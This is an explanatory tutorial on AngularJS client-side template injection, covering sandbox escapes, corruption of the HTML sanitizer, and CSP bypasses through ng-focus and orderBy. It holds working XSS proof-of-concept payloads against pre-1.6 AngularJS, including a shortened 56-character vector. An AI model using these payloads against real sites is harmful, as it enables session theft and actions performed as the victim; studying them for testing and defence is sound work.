**Note**: This section covers client-side template injection flaws and the ways they can be leveraged to achieve XSS. While the underlying issue applies broadly across frameworks, the examples here center on AngularJS, since it's where this vulnerability shows up most often. We'll walk through constructing exploits that break out of the AngularJS sandbox, and explore how AngularJS functionality can sometimes be used to get around content security policy (CSP) restrictions.

# 1. Fundamentals

## 1.1 - What is client-side template injection

Some JavaScript frameworks (like AngularJS) let you build web pages using **templates** — special expressions that get evaluated in the browser and turned into dynamic content.

The problem happens when a site takes user input and drops it directly into one of these templates, instead of just displaying it as plain text. When the page loads, the framework scans the whole page looking for template syntax — and it doesn't know the difference between the site's own code and something an attacker sneaked in.

So if an attacker manages to inject their own template expression into the page, the framework will happily run it, just like any other legitimate expression.

**A normal, safe example (AngularJS):**

```html
<div>{{ 1 + 1 }}</div>
```

This just renders:

```
2
```

**Now imagine user input is inserted straight into the page**, like a search box that echoes back what you typed:

```html
<div>You searched for: {{ userInput }}</div>
```

If `userInput` is meant to just be text, that's fine. But if the app doesn't sanitize it properly, an attacker could submit something like this as their "search term":

```
{{ constructor.constructor('alert(1)')() }}
```

Instead of being treated as harmless text, AngularJS sees the `{{ }}` and tries to **evaluate it as an expression** — which in this case runs arbitrary JavaScript, popping an alert box. In a real attack, that could be used to steal cookies, session tokens, or perform actions on behalf of the victim.

**In short:**
- Template syntax (like `{{ }}`) tells the framework "evaluate this."
- If attacker-controlled input ends up inside that syntax, the attacker controls what gets evaluated.
- That's client-side template injection — and it's a direct path to XSS.

---

## 1.2 - What is the AngularJS sandbox

Think of it as a bouncer for AngularJS templates. When you write an expression inside `{{ }}`, the sandbox checks it before running, blocking anything that touches dangerous stuff like `window`, `document`, or sneaky properties like `__proto__`.

So if an attacker tried something obviously dangerous:
```html
{{ window }}
```
Or:
```htlm
{{ constructor.__proto__ }}
```
...the sandbox would step in and block it before it could do damage.


The AngularJS team never actually promised this sandbox was a real security feature — they were pretty clear it wasn't meant to stop a determined attacker. But a lot of developers assumed it was a solid defense, and built their apps trusting it. Eventually hackers found so many ways around it that AngularJS just gave up and removed the sandbox entirely in version 1.6.

The catch: tons of old apps still run pre-1.6 AngularJS, so this bouncer (and ways to sneak past it) is still relevant today.

---

## 1.3 - How does the AngularJS sandbox work

When AngularJS sees an expression, it does three things:

1. **Rewrites your code** into a safer internal version
2. **Runs some checks** on that rewritten code
3. **Blocks it** if anything looks dangerous

Three main "checks" do the heavy lifting:

**`ensureSafeObject()`** — **catches self-referencing objects**. Catches objects like `window` by checking a clever trick: does this object reference *itself*? `window` does (`window.window === window`), so it gets flagged.

```js
// Simplified idea of what it's checking:
if (obj.window === obj) {
  throw "Blocked! This looks like the window object";
}
```

**`ensureSafeMemberName()`** — **blocks risky property names**. Checks property names you're trying to access. If you try `__proto__` or `__lookupGetter__`, it slams the door shut.

```js
// Blocked examples:
foo.__proto__
foo.__lookupGetter__('bar')
```

**`ensureSafeFunction()`** — **blocks dangerous function calls**. Stops you from calling risky function methods.

```js
// Blocked examples:
foo.call(...)
foo.apply(...)
foo.bind(...)
foo.constructor(...)
```

---

If you're curious what the "rewritten code" actually looks like, there's a [JSFiddle](http://jsfiddle.net/2zs2yv7o/1/) you can open, set a breakpoint at a specific line in `angular.js`, and inspect a variable called `fnString` — that's literally the transformed version of your expression that the sandbox is analyzing.

**Quick analogy:** imagine airport security scanning your luggage (the expression), specifically checking for banned items (`window`, `__proto__`, `.constructor()`) before letting it through. The sandbox is that scanner — except researchers kept finding new ways to disguise the banned items, so eventually AngularJS just removed the scanner altogether.

# 2. How does an AngularJS sandbox escape work

The basic idea behind a sandbox escape: instead of trying to sneak a dangerous *object* past the sandbox's checks, you **trick the sandbox's own checking logic** into vouching for something malicious.

**The classic trick — breaking `charAt()`**

The sandbox has a function called `isIdent()` that checks, character by character, whether something looks like a safe identifier (a variable name — letters, numbers, `_`, `$`). To do this character-by-character check, it relies on JavaScript's built-in `charAt()` function to pull out one character at a time.

Here's the twist: early AngularJS didn't stop you from *overwriting* `charAt()` from inside an expression:

```js
'a'.constructor.prototype.charAt=[].join
```

This swaps out `charAt()` for `[].join` (array join), which behaves totally differently — instead of returning one character, it returns *everything* it's given, all at once.

So now, when `isIdent()` runs a check like this:

```js
isIdent('x9=9a9l9e9r9t9(919)')
```

...it *thinks* it's checking a single character. But because `charAt()` is broken, it's actually comparing a whole string. Since the first letter of that string (`x`) happens to fall in the "safe" a–z range, `isIdent()` gets fooled and says "yep, looks safe" — even though the full string is clearly not just one harmless character.

Once `isIdent()` can be tricked like that, the sandbox basically stops doing its job, and you can slip in a real payload:

```js
$eval('x=alert(1)')
```

We use `$eval()` here specifically because the broken `charAt()` doesn't take effect until the expression actually *runs* — so we need a way to trigger a second evaluation after the damage is done.

**End result:** the sandbox's own logic was turned against it, and arbitrary JavaScript runs.

## 2.1 - Constructing an advanced AngularJS sandbox escape

The trick above assumes you can freely type things like quotes (`'`) and call `$eval()`. Real-world targets are often stricter — for example, they might **block quote characters** entirely to make injection harder.

**Problem 1: No quotes allowed**

Without quotes, you can't easily write a string like `'alert(1)'`. The usual fix is `String.fromCharCode()`, which builds strings from character codes instead:

```js
String.fromCharCode(97,108,101,114,116) // builds "alert"
```

But there's a catch — AngularJS's sandbox also blocks direct access to the `String` constructor. The workaround is to reach `String` indirectly, through the `.constructor` property of a string you already have:

```js
'x'.constructor.fromCharCode(97,108,101,114,116)
```

The tricky part: to even get `'x'.constructor`, you need a string in the first place — and you're not allowed to type one with quotes. So part of the challenge becomes: *how do I create a string without ever typing `'` or `"`?* (This usually involves creative tricks like pulling a character from an existing array or object.)

**Problem 2: No `$eval()` available**

Sometimes `$eval()` simply isn't defined on the page, so the classic escape path is blocked. In that case, AngularJS's `orderBy` filter can be repurposed instead.

Normally, `orderBy` is just used to sort a list:

```js
[123]|orderBy:'Some string'
```

Here, `|` isn't a bitwise OR like in normal JavaScript — in AngularJS templates, it means **"pass this into a filter."** So this line takes the array `[123]` and pipes it into `orderBy`, giving it the string `'Some string'` as an argument (indicated by the colon).

The useful part: `orderBy` doesn't just accept plain strings — it also accepts full **expressions**. That means instead of giving it something to sort by, you can hand it a malicious expression, and it'll evaluate it — giving you a second route to run arbitrary code, even without `$eval()`.

## 2.2 - Corrupting the sanitizer

Before this technique was used to break the sandbox itself, it was first discovered as a way to defeat Angular's **HTML sanitizer** — the filter used by `ng-bind-html` to allow "safe" HTML to be rendered, by running it through a whitelist of permitted tags/attributes.

The core idea: Angular expressions can't define new functions, but they *can* overwrite existing native ones by pointing a property at a different built-in function. If you can make a native function misbehave, you can smuggle bad output through code that assumes it's trustworthy.

**Backdooring `String.fromCharCode`**

`fromCharCode` is called on the `String` constructor, so its `this` value is the `String` constructor itself. That means you can swap it for `Array.prototype.join`, then fake the constructor into looking like a one-item array by giving it a `0` property (it already has a `length` of 1, since `fromCharCode` normally takes one argument):

```js
'a'.constructor.fromCharCode = [].join;
'a'.constructor[0] = '<iframe onload=alert(/Backdoored/)>';
```

After this, *any* call to `String.fromCharCode(...)` anywhere on the page returns the attacker's string instead of doing its real job.

**Backdooring `charCodeAt`**

A similar idea applies to `charCodeAt`, which Angular's sanitizer used internally (via `encodeEntities`) to HTML-encode characters one at a time. Here `this` is a string literal, not the constructor, so the array-length trick doesn't work directly — but swapping it for `Array.prototype.concat` works instead:

```js
''.constructor.prototype.charCodeAt = [].concat;
```

Once corrupted, calling `charCodeAt` no longer returns a character code — it returns the original string concatenated with whatever argument was passed in. Since the sanitizer's encoding routine assumed `charCodeAt` always returns a number, this let raw, unfiltered content flow straight into supposedly-sanitized attribute output, defeating the filter entirely.

This same "swap a native method for one that returns unexpected output" approach is what was then repurposed to defeat the sandbox itself, by targeting `charAt` (covered in 1.4).

# 3. How does an AngularJS CSP bypass work

CSP (Content Security Policy) bypasses are cousins of the sandbox escapes we've already looked at, but they usually need a bit of HTML injection to get going, not just a JavaScript expression on its own.

**Why the usual tricks stop working**

When a site turns on AngularJS's CSP mode, Angular changes how it parses expressions — specifically, it stops using the `Function` constructor internally. Since our earlier `charAt`/`isIdent()` escape (and similar ones) rely on exploiting how that parsing works, they simply don't apply anymore under CSP mode. We need a different route in.

**The problem CSP creates — and how AngularJS accidentally reopens a door**

CSP is great at blocking regular inline JavaScript events, like `onclick="alert(1)"`. But AngularJS has its *own* event system — things like `ng-click` or `ng-focus` — which CSP doesn't block, since technically it's not raw JavaScript, it's an Angular directive.

Inside one of these Angular events, you get access to a special `$event` object — this is just Angular's wrapper around the normal browser event object. And here's the interesting part: on Chrome, that event object has a hidden property called `path`. This `path` is an array showing every object involved in triggering the event — and the *last* item in that array is always the `window` object.

So if we can get our hands on `window` through this array (instead of writing `window` directly, which the sandbox would catch), we can slip past the sandbox's detection.

**Putting it together**

```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

Here's what's happening, step by step:

1. `autofocus` makes the input grab focus automatically when the page loads.
2. That triggers `ng-focus`, giving us access to `$event.path` — our sneaky way of grabbing `window`.
3. We pipe that array into `orderBy` (a filter we've used before to smuggle in expressions).
4. Inside `orderBy`, we call `[].constructor.from([1], alert)`. This uses `Array.from()`, which takes an array and applies a function to each item in it — in this case, calling `alert()` on the single item `1`.

**Why this sneaks past the sandbox:** normally, calling a function that needs `window` behind the scenes would get flagged, since the sandbox is watching for exactly that kind of access. But by routing the call through `Array.from()`, we never *directly* write `window` or call it in an obvious way — we're just handing `alert` off as a callback function, letting `from()` invoke it indirectly. The sandbox's checks don't catch this disguised path.

## 3.1 - Bypassing a CSP with an AngularJS sandbox escape

Sometimes a target limits how many characters you're allowed to inject, which rules out the longer payload above. In that case, you need an even shorter way to sneak `alert()` past the sandbox's `window`-detection.

One neat trick: `Array.prototype.map()`.

```js
[1].map(alert)
```

This works the same basic way as the `from()` example: `map()` calls a given function once for every item in the array. Since we're just handing `alert` over as a *reference* — never typing `window.alert` or anything that obviously touches `window` — the sandbox has nothing to catch.

**The general challenge to solve:** find creative, short ways to pass `alert` (or another function) as a plain callback to a built-in array method, since that's the pattern that consistently slips past AngularJS's `window` detection.

## 3.2 - Shrinking the CSP bypass: a character-golfing walkthrough

The payload in section 3 works, but it's not the shortest possible version. When a target has a strict length limit on injectable input, every character counts. This section walks through how the original vector was progressively trimmed down, step by step, until it hit just 56 characters.

**Starting point (63 characters)**

```html
<input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'>
```

This uses a neat detection trick: `$event.path` is an array of every DOM object involved in triggering the event, ending with `window`. As `orderBy` walks through the array evaluating the expression once per element, the code needs a way to know *when* it has reached the `window` element specifically (rather than acting on every element along the way). It does this by checking for `CSS` — a property that only exists on `window`. Once that check passes, `.map(alert)` calls `alert` on the array, using `window` as the calling context without ever writing the word `window` directly.

**Step 1 — swap `CSS` for the input's own `id` (shorter)**

```html
<input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'>
```

Any element with an `id` attribute automatically becomes a global property on `window` with that same name. So instead of relying on the built-in `CSS` property, the injected `<input id=x>` creates its own marker (`x`) that can be checked for instead — same effect, fewer characters.

**Step 2 — replace `.map()` with `.pop()` (same length, different shape)**

```html
<input id=x ng-focus=$event.path|orderBy:'x&&[alert].pop()(1)'>
```

Instead of mapping `alert` over an array, this puts `alert` inside a one-item array, pops it back out, and calls it immediately with `(1)`.

**Step 3 — drop the window-check entirely (shorter)**

```html
<input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
```

This step relies on a quirk of AngularJS: it lets you call functions that are undefined without throwing an error. That means the `x&&` safety check — which existed to make sure the code only ran once the window object was actually reached — can simply be removed without breaking anything.

**A dead end — indexing instead of `.pop()`**

```html
<input id=x ng-focus=$event.path|orderBy:'[alert][0](1)'>
```

This looks like it should work the same way, just shorter — but it doesn't. Calling `alert` this way loses its connection to `window` as the calling object, and `alert` specifically requires `window` as its context to run. So this version throws an error instead of working.

**Final version — 56 characters**

```html
<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
```

The winning trick: instead of pulling `alert` out of an array, this simply **assigns `alert` to a new variable and calls it immediately**. This sidesteps AngularJS's window-detection altogether, while still preserving `alert`'s connection to `window` — giving the shortest working payload of the bunch.

## 3.3 - Update: Chrome removed `path`

As of **Chrome 109**, the `path` property used throughout this technique no longer exists on event objects. The fix is simple — swap it for the standards-based `composedPath()` method, which returns the same kind of array:

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>
```

Everything else about the technique (the `orderBy` filter, the assignment trick, the reliance on `window` being the last element of the path) still works exactly the same — only the property name changed.
